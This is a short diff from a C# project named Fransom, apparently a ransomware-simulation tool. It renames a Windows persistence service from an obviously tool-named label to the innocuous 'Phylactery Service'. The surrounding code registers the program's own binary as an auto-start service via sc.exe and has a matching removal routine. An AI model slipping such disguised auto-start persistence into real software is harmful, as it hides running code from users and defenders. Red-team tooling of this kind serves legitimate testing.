@@ -126,8 +126,8 @@ namespace Fransom
                 Console.WriteLine("Installing Phylactery service");
                 // this will be changed to CreateService eventually
                 string FransomBinary = Assembly.GetEntryAssembly().Location;
-                string DisplayName = "Fraktal Fransom Persistence Service";
-                string ServiceName = "Fransom";
+                string DisplayName = "Phylactery Service";
+                string ServiceName = "Phylactery";
                 Process process = new Process();
                 process.StartInfo.FileName = "sc.exe";
                 process.StartInfo.Arguments = "\\\\. create " + ServiceName + " type= own start= auto" + " displayname= \"" + DisplayName + "\" binpath= " + FransomBinary;
@@ -153,7 +153,7 @@ namespace Fransom
                 // this will be changed to DeleteService eventually
                 Console.WriteLine("Removing Phylactery service");
                 string FransomBinary = Assembly.GetEntryAssembly().Location;
-                string ServiceName = "Fransom";
+                string ServiceName = "Phylactery";
                 Process process = new Process();
                 process.StartInfo.FileName = "sc.exe";
                 process.StartInfo.Arguments = "\\\\. delete " + ServiceName;
